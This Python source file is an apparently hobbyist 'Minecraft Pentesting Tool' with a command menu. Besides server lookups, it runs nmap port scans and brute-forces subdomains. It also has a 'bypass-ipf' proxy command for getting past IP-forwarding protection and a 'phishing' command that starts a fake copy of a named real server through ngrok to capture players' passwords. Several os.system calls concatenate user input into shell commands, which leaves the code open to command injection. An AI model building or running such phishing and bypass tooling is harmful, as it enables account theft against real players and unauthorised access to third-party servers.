import os
import time
import platform
import sys
import webbrowser
import subprocess
import pyfiglet
import mcstatus
import minecraft
import json
import random
import requests
import requests.exceptions
import re
import future
import socket

from urllib.error import URLError
from urllib.parse import urlsplit
import urllib.request
from urllib.request import urlopen
from colorama import *
from mcstatus import *
from minecraft.networking.connection import Connection
from minecraft.networking.packets import Packet, clientbound, serverbound
from minecraft.compat import input



init ()

so = platform.system()
press = " Press a key to return to the menu ..."
os.system("title MCPTool v0.1")
print(Back.BLACK + "")


###########
# Comandos
###########

def help():
    print("")
    print("    ╔══════════════════════════════════════════════════════════════════════════╗")
    print("    ║         Command            ║                Function                     ║")
    print("    ║                            ║                                             ║")
    print("    ║══════════════════════════════════════════════════════════════════════════║")
    print("    ║ get-ip [server]            ║ Displays the IP address of a server.        ║")
    print("    ║ get-info [server]          ║ Displays information about a server.        ║")
    print("    ║ get-player [name]          ║ Displays information about a player.        ║")
    print("    ║ open-pagestatus [ip]       ║ Opens a page that shows server information. ║")
    print("    ║ scan-ports [ip] [ports]    ║ Scan the ports of a server.                 ║")
    print("    ║ scan-subd  [ip]            ║ Scans the subdomains of a server.           ║")
    print("    ║ bypass-ipf [ip:port]       ║ Bypass IP Forwarding screen.                ║")
    print("    ║ phishing [server]          ║ Create a fake server to capture passwords.  ║")
    print("    ║                            ║                                             ║")
    print("    ║ clear                      ║ Clean the screen.                           ║")
    print("    ║ discord                    ║ Takes you to my Discord server page.        ║")
    print("    ╚══════════════════════════════════════════════════════════════════════════╝")



##########
# Limpiar
##########

def cmdclear():
        if so == "Windows":
            os.system("cls")
        else:
            os.system("clear")

###########
# Banners:
###########

def banner():
    print("")
    print("")
    print("")
    print(Fore.RED + "    ███╗   ███╗ ██████╗██████╗     ████████╗ ██████╗  ██████╗ ██╗     " + Fore.LIGHTRED_EX + "    Telegram: " + Fore.WHITE + "wrrulos")
    print(Fore.RED + "    ████╗ ████║██╔════╝██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     " + Fore.LIGHTRED_EX + "    Discord: " + Fore.WHITE + "discord.gg/cVXMGGcWvu")
    print(Fore.RED + "    ██╔████╔██║██║     ██████╔╝       ██║   ██║   ██║██║   ██║██║     " + Fore.LIGHTRED_EX + "    Github: " + Fore.WHITE + "@wrrulos")
    print(Fore.WHITE + "    ██║╚██╔╝██║██║     ██╔═══╝        ██║   ██║   ██║██║   ██║██║     " )
    print(Fore.WHITE + "    ██║ ╚═╝ ██║╚██████╗██║            ██║   ╚██████╔╝╚██████╔╝███████╗" + Fore.LIGHTRED_EX + "    Minecraft Pentesting Tool " + Fore.LIGHTGREEN_EX + "v0.1")
    print(Fore.WHITE + "    ╚═╝     ╚═╝ ╚═════╝╚═╝            ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝" )
    print("")



def check(ip, port):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
		s.settimeout(2);
		s.connect((ip, int(port)));
		s.send(b'\xfe\x01');
		data = s.recv(1024)[3:].decode("utf-16be")[3:].split("\x00")
		s.close()
		motd = re.sub(r'§[a-zA-Z0-9]', '', data[2].strip().replace('  ', '').replace('  ', ''))
		version = re.sub(r'§[a-zA-Z0-9]', '', data[1].strip().replace('  ', '').replace('  ', ''))
		players = re.sub(r'§[a-zA-Z0-9]', '', f'{data[3]}/{data[4]}'.strip().replace('  ', '').replace('  ', ''))
		print(f'{Fore.LIGHTBLACK_EX}   [{Fore.GREEN}√{Fore.LIGHTBLACK_EX}] {Fore.LIGHTBLACK_EX}{ip}:{port} {Fore.WHITE}» {Fore.LIGHTGREEN_EX}{players} {Fore.LIGHTCYAN_EX}{version} {Fore.LIGHTMAGENTA_EX}{motd}')
	except socket.timeout:
		print(f'{Fore.LIGHTBLACK_EX}   [{Fore.RED}-{Fore.LIGHTBLACK_EX}] {Fore.LIGHTBLACK_EX}{ip}:{port} {Fore.WHITE}» {Fore.LIGHTRED_EX}timed out')
	except IndexError:
		print("")

########
# Menu:
########

def menu():
    print("")
    cmdclear()
    banner()
    print("")
    while True:
        print("")
        print(Fore.LIGHTCYAN_EX + "    MCPTool " + Fore.LIGHTBLACK_EX + "» " + Fore.WHITE + "", end='')
        arg = input().split()
        try:
            comando = arg[0].lower()
            if comando == "help":
                help()
            elif comando == "clear":
                cmdclear()
                banner()
                print("")
            elif comando == "get-ip":
                try:
                    server = arg[1]
                    try:
                        serverip = socket.gethostbyname(str(server))
                        print("")
                        print("")
                        print(Fore.LIGHTBLACK_EX+ "    [" + Fore.GREEN + "√" + Fore.LIGHTBLACK_EX + "]" + Fore.WHITE + " The IP address is " + Fore.LIGHTGREEN_EX + serverip)
                        print("")
                    except:
                        print("")
                        print("")
                        print(Fore.LIGHTBLACK_EX + "    [" + Fore.LIGHTRED_EX + "ERROR" +Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTRED_EX + " Could not connect to server.")
                        print("")
                except:
                    print("")
                    print("")
                    print(Fore.WHITE + "    Usage: get-ip [server]")
                    print("")
            elif comando == "get-info":
                try:
                    serverip = arg[1]
                    try:
                        server = MinecraftServer.lookup(serverip)
                        status = server.status()
                        print ("")
                        print (Fore.LIGHTMAGENTA_EX + "    IP: " + Fore.WHITE + (serverip))
                        print (Fore.LIGHTMAGENTA_EX + "    Players: " + Fore.WHITE + str(status.players.online) + "/" + str(status.players.max))
                        print (Fore.LIGHTMAGENTA_EX + "    Version: " + Fore.WHITE + str(status.version.name) + " - " + str(status.version.protocol))
                        print (Fore.LIGHTMAGENTA_EX + "    Description: " + Fore.WHITE + str(status.description))
                        print ("")
                    except:
                        print("")
                        print("")
                        print(Fore.LIGHTBLACK_EX + "    [" + Fore.LIGHTRED_EX + "ERROR" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTRED_EX + " Could not connect to server.")
                        print("")
                except:
                    print("")
                    print("")
                    print(Fore.WHITE + "    Usage: get-info [server]")
                    print("")
            elif comando == "get-player":
                try:
                    jugador = arg[1]
                    mojang = "https://api.mojang.com/users/profiles/minecraft/"
                    text = requests.get((mojang)+(jugador))
                    try:
                        if text.text == "":
                            print ("")
                            print(Fore.LIGHTMAGENTA_EX + "    Nick: " + Fore.WHITE + (jugador))
                            print(Fore.LIGHTMAGENTA_EX + "    UUID: " + Fore.WHITE + "None" )
                            print(Fore.LIGHTMAGENTA_EX + "    Type: " + Fore.WHITE + "Cracked")
                        else:
                            a = (text.text).split('"')
                            uuid = (a)[3]
                            print("")
                            print(Fore.LIGHTMAGENTA_EX + "    Nick: " + Fore.WHITE + (jugador))
                            print(Fore.LIGHTMAGENTA_EX + "    UUID: " + Fore.WHITE + (uuid))
                            print(Fore.LIGHTMAGENTA_EX + "    Type: " + Fore.WHITE + "Premium")
                    except:
                        print("")
                        print (Fore.LIGHTBLACK_EX + "    [" + Fore.LIGHTRED_EX + "ERROR" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTRED_EX + " You need to have an internet connection to run this command.")
                except:
                    print("")
                    print("")
                    print(Fore.WHITE + "    Usage: get-player [player]")
                    print("")
            elif comando == "scan-ports":
                try:
                    ip = arg[1]
                    ports = arg[2]
                    try:
                        print("")
                        print(Fore.LIGHTBLACK_EX + "    [" + Fore.LIGHTCYAN_EX + "*" + Fore.LIGHTBLACK_EX + "] " + Fore.WHITE + "Scanning...")
                        print("")
                        os.system("nmap -p " + ports + " -T5 -v -Pn -oN temp.txt " + ip + " >nul")
                        os.system("copy temp.txt " + ip + ".txt >nul && move " + ip + ".txt scans\ip." + ip + ".txt >nul" )
                        print("")
                        print("")
                        try:
                        	with open("temp.txt") as f:
                        		content = f.read()
                        		reports = content.split('Nmap scan report for ')
                        		for report in reports:
                        			if ip != []:
                        				ports = re.findall(r'([0-9]+)/tcp', report)
                        				for port in ports:
                        					check(ip, port)
                        except:
                        	print("")
                    except:
                        print("")
                except:
                    print("")
                    print("")
                    print(Fore.WHITE + "    Usage: scan-ports [ip] [ports]")
                    print("")

            elif comando == "scan-subd":
                try:
                    ip = arg[1]
                    try:
                        subdominios = ("node1", "node2", "node3", "node 4", "node5", "node6", "node7", "node8", "node9", "node10", "node11", "node12", "node13", "node14", "node15", "node16", "node17", "node18", "node19", "node20", "node001", "node002", "node01", "node02", "node003", "sys001", "sys002", "go", "admin", "eggwars", "bedwars", "lobby1", "hub", "builder", "developer", "test", "test1", "forum", "bans", "baneos", "ts", "ts3", "sys1", "sys2", "mods", "bungee", "bungeecord", "array", "spawn", "server", "help", "client", "api", "smtp", "s1", "s2", "s3", "s4", "server1", "server2", "jugar", "login", "mysql", "phpmyadmin", "demo", "na", "eu", "us", "es", "fr", "it", "ru", "support", "developing", "discord", "backup", "buy", "buycraft", "go", "dedicado1", "dedi", "dedi1", "dedi2", "dedi3", "minecraft", "prueba", "pruebas", "ping", "register", "cdn", "stats", "store", "serie", "buildteam", "info", "host", "jogar", "proxy", "vps", "ovh", "partner", "partners", "appeals", "appeal", "store-assets", "builds", "testing", "server", "pvp", "skywars", "survival", "skyblock", "lobby", "hg", "games", "sys001", "sys002", "node001", "node002", "games001", "games002", "us72", "us1", "us2", "us3", "us4", "us5", "goliathdev", "staticassets", "rewards", "rpsrv", "ftp", "ssh", "web", "jobs", "render", "www", "build", "web", "dev", "staff", "mc", "play", "sys", "live")
                        print("")
                        print("")
                        for subd in subdominios:
                            try:
                                ipsrv = str(subd) + "."+str(ip)
                                iphost = socket.gethostbyname(str(ipsrv))
                                print (Fore.LIGHTBLACK_EX + "    [" + Fore.GREEN + "√" + Fore.LIGHTBLACK_EX + "]" + Fore.GREEN + " Subdomain found " + Fore.LIGHTBLACK_EX + "» " + Fore.LIGHTWHITE_EX + "" + str(subd)+"."+str(ip) + Fore.BLACK+"" + str(iphost))
                            except:
                                pass
                    except:
                        print("")
                except:
                    print("")
                    print("")
                    print(Fore.WHITE + "    Usage: scan-subd [ip] ")
                    print("")

            elif comando == "bypass-ipf":
                try:
                    ip = arg[1]
                    try:
                        print("")
                        print(Fore.LIGHTBLACK_EX + "    [" + Fore.LIGHTCYAN_EX + "*" + Fore.LIGHTBLACK_EX + "] " + Fore.WHITE + "Starting Proxy...")
                        os.system("cd bungee && copy config.txt config.yml >nul && echo     address: " + ip + " >> config.yml && echo     restricted: false >> config.yml && start start.bat")
                        os.system("timeout 10 >nul")
                        print("")
                        print(Fore.LIGHTBLACK_EX + "    [" + Fore.LIGHTCYAN_EX + "IP" + Fore.LIGHTBLACK_EX + "] " + Fore.LIGHTGREEN_EX + "0.0.0.0:25567")
                    except:
                        print("")
                        print("")
                        print(Fore.WHITE + "    Usage: bypass-ipf [ip:port] ")
                        print("")
                except:
                    print("")
                    print("")
                    print(Fore.WHITE + "    Usage: bypass-ipf [ip:port] ")
                    print("")

            elif comando == "phishing":
                try:
                    server = arg[1]
                    try:
                        if arg[1] == "mc.universocraft.com":
                            print("")
                            print(Fore.LIGHTBLACK_EX + "    [" + Fore.LIGHTCYAN_EX + "*" + Fore.LIGHTBLACK_EX + "] " + Fore.WHITE + "Starting server...")
                            os.system("cd phishing && cd mc.universocraft.com && start start.bat ")
                            os.system("timeout 2 >nul")
                            print(Fore.LIGHTBLACK_EX + "    [" + Fore.LIGHTCYAN_EX + "*" + Fore.LIGHTBLACK_EX + "] " + Fore.WHITE + "Starting ngrok...")
                            os.system("start ngrok.exe tcp 25565")
                            os.system("cd phishing && cd mc.universocraft.com && del datos.txt && echo. >> datos.txt")
                            print("")
                            print(Fore.LIGHTBLACK_EX + "    [" + Fore.LIGHTCYAN_EX + "*" + Fore.LIGHTBLACK_EX + "] " + Fore.WHITE + "Starting console...")
                            os.system("timeout 2 >nul")
                            os.system("cd phishing && cd mc.universocraft.com && start python consola.py")
                            print("")
                        else:
                            print("")
                            print("")
                            print(Fore.WHITE + "    Usage: phishing [server] ")
                            print(Fore.WHITE + "    Available servers: " + Fore.GREEN + "mc.universocraft.com")
                            print("")
                    except:
                        print("")
                        print("")
                        print(Fore.WHITE + "    Usage: phishing [server] ")
                        print(Fore.WHITE + "    Available servers: " + Fore.GREEN + "mc.universocraft.com")
                        print("")
                except:
                    print("")
                    print("")
                    print(Fore.WHITE + "    Usage: phishing [server] ")
                    print(Fore.WHITE + "    Available servers: " + Fore.GREEN + "mc.universocraft.com")
                    print("")

            elif comando == "open-pagestatus":
                try:
                    ip = arg[1]
                    try:
                        print("")
                        webbrowser.open_new("https://mcsrvstat.us/server/" + ip)
                        print("")
                    except:
                        print("")
                        print (Fore.LIGHTBLACK_EX + "    [" + Fore.LIGHTRED_EX + "ERROR" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTRED_EX + " There was an error trying to open the page..")
                        print("")
                except:
                    print("")
                    print("")
                    print(Fore.WHITE + "    Usage: open-pagestatus [ip] ")
                    print("")

            elif comando == "discord":
                try:
                    print("")
                    webbrowser.open_new("https://discord.gg/cVXMGGcWvu")
                    print("")
                except:
                    print("")
                    print (Fore.LIGHTBLACK_EX + "    [" + Fore.LIGHTRED_EX + "ERROR" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTRED_EX + " There was an error trying to open the page..")
                    print("")

            else:
                print("")
                print("")
                print(Fore.LIGHTRED_EX + "    Unknown command. Type help to see the available commands.")
                print("")

        except:
            print("")
            print("")
            print(Fore.LIGHTRED_EX + "    Unknown command. Type help to see the available commands.")
            print("")

menu()
